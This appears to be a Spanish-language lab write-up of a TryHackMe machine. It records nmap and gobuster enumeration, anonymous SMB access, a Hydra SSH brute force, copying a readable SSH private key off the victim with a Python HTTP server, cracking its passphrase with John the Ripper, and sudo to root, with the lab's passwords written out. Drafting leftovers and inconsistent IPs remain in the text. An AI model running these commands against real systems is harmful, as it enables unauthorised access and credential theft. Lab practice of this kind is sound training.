 # Conexión a VPN con OpenVPN en Kali Linux

**Plataforma:** TryHackMe | **Creador Original:** Josiah Pierce (VulnHub)
**Fecha de Realización:** 09/Noviembre/2025
**Objetivo:** Obtener privilegios de root (acceso total) en la máquina objetivo y demostrar el compromiso del sistema.

## 1. Introducción y Objetivos del Laboratorio

Este informe documenta el proceso de prueba de penetración llevado a cabo contra la máquina virtual "[Nombre del Lab]". El objetivo principal de este ejercicio es aplicar la metodología estándar de pruebas de penetración para identificar, explotar y escalar privilegios dentro de un entorno controlado.

### Objetivos de Aprendizaje

El foco de este laboratorio está en el desarrollo y la demostración de las siguientes habilidades clave de un analista ofensivo:

| Habilidad Técnica | Descripción |
|---|---|
| Enumeración de Servicios (Service Enumeration) | Identificar todos los servicios activos y sus versiones (HTTP, FTP, SSH, etc.) para buscar vulnerabilidades conocidas. |
| Fuerza Bruta (Brute Forcing) | Utilizar diccionarios para descifrar credenciales o contenidos ocultos en puntos de acceso específicos. |
| Cracking de Hash (Hash Cracking) | Obtener hashes de contraseñas de usuarios del sistema y utilizar herramientas como Hashcat o John The Ripper para descifrarlos. |
| Enumeración Linux (Linux Enumeration) | Realizar una auditoría interna del sistema comprometido para identificar vectores de escalada de privilegios. |

### Diagrama de la Topología (Setup)

**Máquina Atacante (Blue Team):** Kali Linux (Mi VM Personal)
**Máquina Víctima (Red Team):** Máquina virtual [Nombre del Lab]
**Conexión:** Red VPN de TryHackMe (OpenVPN)

## 2. Fase de Conexión y Setup Inicial

Antes de iniciar cualquier escaneo o ataque, fue esencial establecer una conexión segura y privada a la red del laboratorio mediante OpenVPN.

### 2.1. Configuración de Acceso (OpenVPN)

1. **Selección del Servidor:** Se eligió el servidor **[US-East-Regular-1]** de la red de TryHackMe para asegurar la menor latencia posible desde mi ubicación.
2. **Descarga y Conexión:** El archivo de configuración (`[agusrodriguez.2401.ovpn]`) fue descargado y ejecutado en la terminal de mi máquina Kali Linux:

~~~bash
cd ~/Downloads    # Navego hasta el directorio donde se guardó el archivo
sudo openvpn agusrodriguez.2401.ovpn
~~~

3. **Verificación:** La conexión fue verificada en la página de TryHackMe (Conexión: Conectado) y comprobada en la terminal de Kali, confirmando el establecimiento de la secuencia.

![openvpn1](imagenes/Sudo_openvpn_1.png)
![openvpn2](Imagenes/Sudo_openvpn_2.png)


   

## 3. Reconocimiento y Escaneo

El primer paso tras establecer la conexión a la red del laboratorio fue identificar los servicios y puertos expuestos en la máquina objetivo. La IP proporcionada por el laboratorio fue: `10.201.51.84`.

### 3.1 Escaneo inicial con Nmap

Se ejecutó un escaneo básico para listar puertos abiertos:

```bash
nmap 10.201.51.84
```
### 3.2 Extraer los números de puerto y volcarlos a un fichero

Para automatizar el siguiente paso (por ejemplo, lanzar escaneos o ataques puntuales contra puertos concretos), extraje solo los números de puerto abiertos y los guardé en un fichero port.txt. El pipeline utilizado fue:

```bash
nmap 10.201.51.84 | grep "/tcp" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//' > port.txt
```


**Explicación breve y ordenada del pipeline:**

- nmap 10.201.51.84 — realiza el escaneo y genera la salida que contiene líneas como 22/tcp open ssh.

- grep "/tcp" — filtra únicamente las líneas que describen puertos TCP (evita información irrelevante).

- cut -d'/' -f1 — divide cada línea por la barra / y selecciona el primer campo (el número de puerto). Ej.: 22/tcp → 22.

- tr '\n' ',' — reemplaza los saltos de línea por comas, transformando la lista vertical en una lista separada por comas: 22,80,139,....

- sed 's/,$//' — elimina la coma final sobrante si la hubiera.

- > port.txt — redirige la salida final al fichero port.txt.

### 3.3 Verificar el contenido generado

Para comprobar que el fichero port.txt contiene la lista esperada:

```bash
cat port.txt
# salida esperada de ejemplo:
# 22,80,139,445,8009,8080
```

### 3.4 Escaneo profundo (detección de versiones y scripts)

Para obtener información más detallada sobre los servicios detectados en el escaneo inicial, ejecuté un escaneo más exhaustivo sobre la lista de puertos previamente extraída. Este escaneo emplea un *SYN stealth scan* combinado con la detección de versiones y la ejecución de los scripts NSE por defecto:

```bash
# Escaneo "silencioso" (SYN) + detección de versiones + scripts por defecto sobre los puertos listados en port.txt
nmap -sS -sV -sC -p$(cat port.txt) 10.201.51.84
```

**Descripción de las opciones usadas:**

- -sS : SYN scan (escaneo tipo "stealth").

- -sV : detección de versión del servicio (intenta identificar el software y su versión).

- -sC : ejecuta los scripts NSE por defecto (útil para obtener información de servicios y pequeños chequeos de seguridad).

- -p$(cat port.txt) : utiliza la lista de puertos guardada en port.txt (evita escanear puertos no relevantes).

### 3.5 Resultados del escaneo profundo (resumen)

A partir de la salida del comando (ver captura insertada más arriba), se obtuvieron las siguientes observaciones relevantes:

- 22/tcp – ssh
  - Servicio: OpenSSH 8.2p1 (Ubuntu)
  - Observación: el banner muestra la versión del servidor SSH; esta información es útil para buscar vulnerabilidades específicas de la versión o comprobar políticas de cifrado/host-keys.

- 80/tcp – http
  - Servicio: Apache httpd 2.4.41 (Ubuntu)
  - Observación: header del servidor indica Apache sobre Ubuntu. Conviene revisar el contenido web, archivos expuestos y posibles vectores de LFI/RFI o vulnerabilidades de aplicaciones.

- 139/tcp y 445/tcp – netbios-ssn / smb
  - Servicio: Samba smbd 4
  - Observación: puertos SMB abiertos; si los servicios están activos pueden ofrecer directorios/recursos compartidos o información filtrada sobre usuarios y rutas.

- 8009/tcp – ajp13
  - Servicio: Apache Jserv (AJP) v1.3
  - Observación: AJP es un conector usado por Tomcat; en ciertas versiones/configuraciones puede permitir el envío de peticiones a la aplicación web (posibles vectores de exposición).

- 8080/tcp – http (Tomcat)
  - Servicio: Apache Tomcat 9.0.7
  - Observación: servidor de aplicaciones Tomcat identificado; revisar manager/administrador expuesto, cabeceras y posibles vulnerabilidades de deserialización o configuración.
 
## 4. Acceso Web y Enumeración de Directorios

Tras identificar servicios HTTP en los puertos detectados (por ejemplo `80/tcp` y `8080/tcp`), procedí a **abrir la IP objetivo en un navegador** para inspeccionar el contenido web disponible y el código fuente. El objetivo de abrir la web fue confirmar visualmente si hay una aplicación web, identificar mensajes, errores o pistas en el HTML, y obtener ideas sobre posibles directorios o archivos expuestos.

**Motivo:** si una web está presente, muchas veces contiene pistas (mensajes, comentarios HTML, `robots.txt`, títulos, comentarios de desarrollador) que orientan la siguiente etapa de enumeración. Además, la presencia de servicios como Apache/Tomcat sugiere examinar rutas típicas de aplicaciones web.

### 4.1 Inspección inicial y análisis del código fuente

Al abrir la web no se mostró contenido útil visible inicialmente; por eso inspeccioné el **código fuente** de la página. En el HTML apareció el mensaje:

> _"check our dev note section if you need to know what to work on"_

La referencia explícita a la palabra **`dev`** sugirió la posible existencia de un directorio o sección `/development` o `/dev` dentro del sitio. Este tipo de pistas en el contenido público son indicadores valiosos para orientar búsquedas de directorios ocultos o en mantenimiento.

### 4.2 Enumeración de directorios con Gobuster

Dado que no sabía qué había dentro del servidor web, ejecuté una enumeración de directorios para buscar rutas accesibles y ficheros que pudieran contener información sensible o pistas adicionales:

```bash
gobuster dir -u http://10.201.51.84/ -w /usr/share/wordlists/dirb/common.txt
```

- -u : URL objetivo.

- -w : wordlist usada (en este caso dirb/common.txt) para probar nombres de directorios y archivos comunes.

**Resultado relevante:** Gobuster encontró el directorio development (o development/). Al acceder a ese directorio se localizaron dos archivos llamativos: dev.txt y j.txt. Inserte la captura de la ejecución de Gobuster y/o del listado de directorios aquí:

### 4.3 Contenido de los ficheros encontrados

- j.txt (fragmento relevante):

> _For J:
I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.
-K
_

**Interpretación:** el mensaje indica que alguien (firma -K) revisó /etc/shadow y pudo crackear una contraseña fácilmente. Esto es una fuerte pista de que existen credenciales débiles en el sistema, y sugiere que podríamos obtener acceso mediante credenciales descubiertas o técnicas de fuerza bruta sobre servicios que acepten autenticación (por ejemplo SSH, Samba). Además, la mención explícita a J sugiere que el hash vulnerado pertenece o está relacionado con el usuario “J”.

- dev.txt (fragmento relevante):

> _2018-04-23: I've been messing with that struts stuff, and it's pretty cool! ... using version 2.5.12 ... -K
2018-04-22: SMB has been configured. -K
2018-04-21: I got Apache set up. Will put in our content later. -J_

**Interpretación:**

- Aparece la versión Struts 2.5.12, lo que orienta a investigar vulnerabilidades conocidas de Struts (sistemas web Java).

- La entrada SMB has been configured confirma la presencia previa del servicio SMB (coincide con los puertos 139 y 445 detectados por Nmap). Esto sugiere que SMB podría estar activo y configurado (posible vector de enumeración de recursos compartidos o información sensible).

- Los mensajes están firmados por -K y -J: hay dos identidades recurrentes en los logs/pistas. Por el contenido y tono de los mensajes, es razonable deducir que:
 - K actúa como administrador o auditor (comenta sobre configuración y revisiones), ya que menciona tareas de configuración (SMB, Struts) y acciones de auditoría.
 - J parece ser un usuario que hizo despliegues o aportó contenido inicialmente (firma una entrada sobre haber montado Apache), por lo que podría tratarse de otro rol (desarrollador o usuario con privilegios de despliegue).

Estas deducciones (K como administrador/auditor y J como usuario/desarrollador) se apoyan en el contexto y la firma de las entradas, aunque habría que confirmarlas con evidencia posterior (por ejemplo a través de enumeración SMB, revisión de usuarios del sistema, o búsquedas en archivos de configuración).

### 4.4 Conclusión y paralelismo con el escaneo anterior

- La aparición de pistas en la web (mención a dev y archivos dev.txt/j.txt) combina con los servicios detectados en Nmap:
 - HTTP/Apache/Tomcat — contenido web, posibles aplicaciones Java (Struts), rutas administrativas o ficheros expuestos.
 - SMB (139/445) — posibles recursos compartidos públicos o mal configurados; la entrada en dev.txt confirma que SMB fue configurado.
 - SSH (22) — credenciales débiles detectadas indirectamente (según j.txt) que podrían facilitar acceso si se prueban contra SSH o servicios que acepten autenticación.


## 5. Enumeración SMB (139/445) y descubrimiento de credenciales

Dado que Nmap reportó puertos SMB abiertos (`139/tcp` y `445/tcp`), procedí a enumerar recursos compartidos para encontrar archivos o credenciales que pudieran ayudar en el acceso al sistema.

### 5.1 Breve nota: ¿qué es NetBIOS / SMB?
- **NetBIOS** (Network Basic Input/Output System) es una API/servicio antiguo para comunicación en redes Microsoft; en la práctica moderna aparece junto a **SMB** (Server Message Block) para compartir archivos, impresoras y recursos.  
- SMB suele escuchar en los puertos `139` y `445`. La presencia de SMB suele indicar la posibilidad de listar shares, descargar archivos públicos y recopilar información útil para el reconocimiento (usuarios, nombres de equipos, archivos de configuración, etc.).

### 5.2 Listado de recursos con `smbclient -L`
Probé listar recursos disponibles usando un usuario común (`guest`), ya que en muchos labs hay recursos anónimos o el usuario `guest` es aceptado para listar shares:

```bash
smbclient -L //10.201.25.188 -U guest
```

- Observación: la salida mostró el recurso Anonymous (en la lista como Anonymous o Anonymous Disk) y el servicio IPC$ (para administración remota). Hubo reintentos con SMBv1/negociación de protocolos por compatibilidades, pero la lista de shares fue visible.

- Nota sobre guest: lo intenté con guest porque en la enumeración web/archivos (y en muchos entornos de práctica) aparece Anonymous/guest como recurso anónimo, y porque en el propio lab había pistas que sugerían acceso anónimo a un share. Si no hubiese sido así, este intento habría fallado y habría que probar otros usuarios o técnicas.

### 5.3 Acceso al share Anonymous y descarga de staff.txt

Una vez identificado el share, accedí y listé su contenido:

```bash
smbclient //10.201.25.188/Anonymous -U guest
# dentro del prompt de smbclient:
smb: \> ls
smb: \> get staff.txt
smb: \> exit
```
 revisar esto

- Resultado: dentro del recurso había un fichero llamado staff.txt. Lo descargué y revisé su contenido.

### 5.4 Contenido de staff.txt y las identidades J / K

Contenido relevante (extracto):

```bash
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

 -Kay
```

- Interpretación: a partir de los ficheros dev.txt, j.txt y staff.txt (y sus firmas -K y -J) se infiere que existen al menos dos identidades comentadas en el servidor:
 - Kay (K): por el tono y las acciones descritas (configuraciones, auditorías, indicaciones sobre contraseñas), es razonable asumir que Kay tiene un rol de administrador/auditor.
 - Jan (J): por el tono de las entradas firmadas -J y la mención explícita en staff.txt, Jan parece ser un usuario normal/empleado (posiblemente con cuenta de usuario jan en la máquina).

- En j.txt se muestra además que Kay pudo crackear una contraseña encontrada en /etc/shadow y pidió a Jan cambiarla, lo que sugiere fuertemente que hay credenciales débiles asociadas a Jan u otro usuario.

### 5.5 Comprobación básica de SSH contra el usuario jan

Dado lo anterior, una verificación lógica es intentar autenticar por SSH con el usuario jan (sin usar aún fuerza bruta; sólo verificar el comportamiento del servicio frente a múltiples intentos):

```bash
ssh jan@10.201.51.84
# si se pide contraseña, se prueba con enter/contraseña vacía para comprobar comportamiento
```

- Observación práctica: al intentar iniciar sesión varias veces con contraseña vacía/incorrecta se comprobó que el servicio no bloqueó los intentos inmediatamente, lo que indica que es posible realizar intentos repetidos (importante para un ataque de fuerza bruta controlado).

### 5.6 Conclusión y riesgo

- La combinación de: (a) ficheros expuestos que mencionan contraseñas débiles, (b) shares SMB accesibles y (c) SSH activo sin bloqueo estricto de intentos, sugiere una oportunidad válida para intentar recuperación de credenciales.

- Siguiente etapa (controlada): preparar un ataque dirigido de fuerza bruta sobre SSH usando hydra o herramientas similares, empleando listas de contraseñas relevantes y limitando la velocidad/threads para evitar ruido innecesario.

## 6. Fuerza bruta SSH con Hydra (usuario `jan`)

Después de obtener información a partir de los recursos SMB compartidos y de revisar los ficheros `staff.txt`, `j.txt` y `dev.txt`, concluimos que:

- El usuario **Jan (`jan`)** existe en el sistema.
- Su contraseña es **débil**, ya que Kay (administrador) se lo menciona explícitamente.
- El servicio **SSH** está activo y permite múltiples intentos sin bloquear.

Esto justifica realizar un ataque **de fuerza bruta controlado** sobre SSH.

---

### 6.1 Ataque con Hydra

Para realizar el ataque utilicé *Hydra*, indicando el usuario y un diccionario de contraseñas.  
El comando empleado fue:

```bash
hydra -l jan -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt ssh://10.201.25.188
```
**Explicación de parámetros:**

- l jan: indica el usuario objetivo.
 - Si no conociéramos el usuario, se usaría -L con un diccionario de usuarios.

- P: ruta del diccionario de contraseñas a probar.

- best1050.txt: wordlist pequeña con contraseñas comunes y débiles (ideal para pruebas rápidas).
 - El lab indica que también podría usarse rockyou.txt, que es más grande y tardaría más.
 - ssh://IP: define el servicio y la dirección objetivo.

Resultado: Hydra encontró exitosamente la contraseña:


____ aqui va iamgen de la contraseña (armando)

La contraseña del usuario jan es:

>_armando_

## 7. Acceso SSH con el usuario comprometido

Con la contraseña obtenida, inicié sesión por SSH:

```bash
ssh jan@10.201.51.84
```
Ingresé la contraseña armando y obtuve acceso.

## 8. Enumeración de privilegios y exploración inicial

Una vez dentro del sistema, verifiqué si el usuario tenía privilegios elevados:

```bash
sudo -l
```
Salida:

```bash
Sorry, user jan may not run sudo on basic2.
```
→ jan no posee permisos sudo ni privilegios adicionales asignados.

## 9. Exploración del entorno del usuario

Verifiqué el directorio actual:

```bash
pwd
# /home/jan
```
Listé el contenido:

```bash
ls -la
```
Había un archivo llamado .lesshst, pero no se pudo leer:

```bash
cat .lesshst
# Permission denied
```

A continuación retrocedí al directorio /home para investigar otros usuarios:

```bash
cd ..
ls -l
```

Encontré el directorio del usuario kay, previamente mencionado en los archivos SMB.

## 10. Exploración del directorio del usuario kay

Ingresé en el directorio:

```bash
cd kay
ls -la
```

Algo llamó la atención:

- El directorio .ssh existía.

- Sus permisos eran: drwxr-xr-x

Esto significa:

- El propietario (kay) puede leer/escribir.

- Otros usuarios pueden leer, lo cual es una mala práctica grave.

Ingresé al directorio .ssh:

```bash
cd .ssh
ls
```

Contenido:

```bash
authorized_keys  id_rsa  id_rsa.pub
```

Listando con detalle:

```bash
ls -l
```

Observé que:

- El archivo id_rsa (clave privada SSH) tenía permisos que permitían lectura.

- Esto implica que el usuario jan puede leer la clave privada de kay, lo cual compromete totalmente la seguridad del sistema.

Dado que id_rsa es la clave privada SSH del usuario kay, podemos utilizarla para iniciar sesión como kay y escalar privilegios.

## 12. Extracción de la clave privada SSH del usuario `kay`

Dentro del directorio `/home/kay/.ssh` encontramos tres archivos:

- `authorized_keys`
- `id_rsa`  ← clave privada
- `id_rsa.pub`  ← clave pública

El archivo **id_rsa** es la clave privada del usuario `kay`, y tiene permisos demasiado permisivos, permitiendo que el usuario `jan` pueda leerlo. Esto representa una vulnerabilidad crítica, ya que permite intentar autenticarse por SSH como `kay`.

---

### 12.1 Visualización de la clave privada

Primero verifiqué su contenido:

```bash
cat id_rsa
```
La salida mostraba una clave privada completa. Podría copiarse manualmente, pero es más cómodo y seguro transferirla mediante un servidor temporal.

## 13. Transferencia de la clave privada usando Python (HTTP Server)

Para transferir el archivo a mi máquina atacante, inicié un servidor web temporal desde la máquina víctima usando Python.

Primero comprobé la ruta de Python 3:

```bash
which python3
# /usr/bin/python3
```

Luego inicié un servidor HTTP:

```bash
python3 -m http.server
```

Si no se especifica puerto, este comando usa por defecto el puerto 8000.

Esto permite descargar cualquier archivo del directorio actual a través del navegador o con herramientas como wget.

### 13.1 Obtención de la IP de la víctima

En otra terminal (desde la máquina atacante), revisé la IP del servidor comprometido:

```bash
ip a
```

**Explicación:**
El comando ip a (o ip address) muestra:

- interfaces de red de la máquina

- direcciones IP asignadas

- estado de cada interfaz

En este caso, me permitió identificar la IP interna que usaba la máquina víctima para que la atacante pudiera conectarse al servidor HTTP generado por Python.

### 13.2 Descarga de la clave privada

Desde mi máquina atacante ejecuté:

```bash
wget http://10.201.51.84:8000/id_rsa
```

- 10.201.51.84 → IP de la víctima

- 8000 → puerto del servidor HTTP

- id_rsa → archivo que quiero descargar

Luego verifiqué que el archivo se descargó con el comando 'll'

## 14. Ajuste de permisos para claves SSH (muy importante)

SSH no permite usar claves privadas si no tienen permisos restrictivos.
El archivo debe tener permisos 600, lo que significa:

- Solo el propietario puede leer y escribir.

- Ningún otro usuario puede acceder.

Esto protege la clave privada de accesos indebidos.

Al listar el archivo descargado se veía con permisos más permisivos (por ejemplo 644), por lo que SSH lo bloqueaba.

Para corregirlo:

```bash
chmod 600 id_rsa
```

Verificación:

```bash
ll
# ahora el archivo id_rsa tiene permisos -rw-------
```

## 15. Intento de conexión SSH como kay

Con la clave privada correctamente descargada y configurada, intenté acceder:

```bash
ssh kay@10.201.51.84 -i id_rsa
```

Sin embargo, el sistema respondió:

```bash
Enter passphrase for key 'id_rsa':
```

Esto significa que la clave privada del usuario kay está protegida por una passphrase adicional.
Aunque poseamos la clave, sin la frase de cifrado no es posible usarla para autenticarnos.

Probé presionar Enter varias veces, pero no funcionó.

Por lo tanto, en este punto sabemos que:

- Tenemos la clave privada de kay.

- Pero la clave privada está cifrada.

- Necesitamos romper la passphrase o buscar otra forma de escalar privilegios.

Los siguientes pasos incluirán intentar crackear la passphrase de id_rsa (por ejemplo con ssh2john + john), o buscar otra vía de escalada de privilegios dentro del sistema.

## 16. Obteniendo la frase secreta (passphrase) de la clave privada con John the Ripper

Cuando intentamos conectarnos como el usuario kay usando la clave privada id_rsa, el servidor SSH nos pidió una passphrase:

```bash
Enter passphrase for key 'id_rsa':
```
Esto indica que la clave privada no solo está protegida por permisos (600), sino también cifrada con una frase secreta.
Para poder usarla, necesitamos descubrir esa frase.

### 16.1. Limitaciones de John the Ripper

John the Ripper es una herramienta de cracking de contraseñas que trabaja principalmente con hashes.
Sin embargo:

- John NO soporta directamente el formato cifrado de claves privadas SSH.

- Necesitamos convertir primero la clave privada en un formato que John pueda procesar.

Para eso existe una herramienta especial: ssh2john.

## 17. Convertir la clave privada a un hash con ssh2john

El comando utilizado es:

```bash
ssh2john id_rsa > id_rsa.hash
```
Lo que hace es:

Tomar la clave privada (id_rsa).

Extraer la información necesaria.

Convertirla a un hash compatible con John.

Guardarla en un archivo nuevo llamado id_rsa.hash.

Confirmamos que el archivo existe con 'll', y vemos su contenido con:

```bash
batcat id_rsa.hash
```

Si el contenido aparece correctamente, ya está listo para crackear.

## 18. Crackear la passphrase con John the Ripper

Ahora sí aplicamos John:

```bash
john --w=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**¿Por qué uso rockyou?**

- rockyou.txt es el diccionario más famoso para cracking.

- Tiene millones de contraseñas reales filtradas.

- Es ideal para contraseñas humanas (no generadas por máquina).

- Aunque es grande, John es muy rápido procesándolo.

El ataque encuentra la passphrase:

```bash
beeswax
```

Ya con esto podemos volver a intentar conectarnos por SSH.

## 19. Conexión exitosa con el usuario kay

Ejecutamos de nuevo:

```bash
ssh kay@10.201.51.84 -i id_rsa
```
Cuando pida la passphrase, ingresamos beeswax.

Y ahora sí obtenemos acceso:
Estamos dentro del usuario kay.

## 20. Explorando la cuenta del usuario kay

Listado de archivos con 'ls'. Aparece un archivo ineresante: 

```bash
pass.bak
```

Lo inspeccionamos:

```bash
cat pass.bak
```

El contenido es:

```bash
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Esto probablemente sea la contraseña del usuario kay para sudo u otros servicios.

## 21. Verificación de permisos sudo

Ejecutamos:

```bash
sudo -l
```
Nos pide la contraseña de kay, ingresamos **heresareallystrongpasswordthatfollowsthepasswordpolicy$$**

La salida indica que kay tiene permisos completos para ejecutar cualquier comando como root.

En otras palabras: es prácticamente un administrador total.

## 22. Escalación de privilegios a root

Simplemente ejecutamos:

```bash
sudo su
```

Y ya estamos dentro de la cuenta root, con privilegios máximos.

## 23. Obteniendo el flag final

Buscamos el archivo de la bandera:

```bash
ls /root/
```

La salida incluye:

```bash
flag.txt
```

Finalmente:

```bash
cat /root/flag.txt
```

Este archivo contiene el flag final del laboratorio.

Con esto completamos la intrusión, escalación de privilegios y obtención del objetivo.
